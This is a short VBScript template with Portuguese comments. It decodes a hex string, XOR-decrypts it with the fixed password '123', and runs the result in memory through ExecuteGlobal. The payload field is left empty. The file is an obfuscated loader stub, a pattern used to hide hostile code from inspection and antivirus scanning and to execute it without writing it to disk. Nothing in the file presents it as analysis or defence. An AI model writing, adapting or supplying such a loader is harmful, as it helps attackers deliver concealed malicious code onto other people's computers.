
Set objShell = CreateObject("WScript.Shell")

Function HexToString(hex)
    Dim str
    For i = 1 To Len(hex) Step 2
        str = str & Chr(CByte("&H" & Mid(hex, i, 2)))
    Next
    HexToString = str
End Function

Function XorDecrypt(text, key)
    Dim result, i
    result = ""
    For i = 1 To Len(text)
        result = result & Chr(Asc(Mid(text, i, 1)) Xor Asc(Mid(key, ((i - 1) Mod Len(key)) + 1, 1)))
    Next
    XorDecrypt = result
End Function

' Texto criptografado em hexadecimal (defina seu valor aqui)
hexText = ""

' Senha para descriptografia
password = "123"

' Converte o texto hexadecimal para string
encryptedText = HexToString(hexText)

' Descriptografa o texto
decryptedText = XorDecrypt(encryptedText, password)

' Executa o código descriptografado diretamente na memória
ExecuteGlobal decryptedText

' Limpa os objetos
Set objShell = Nothing
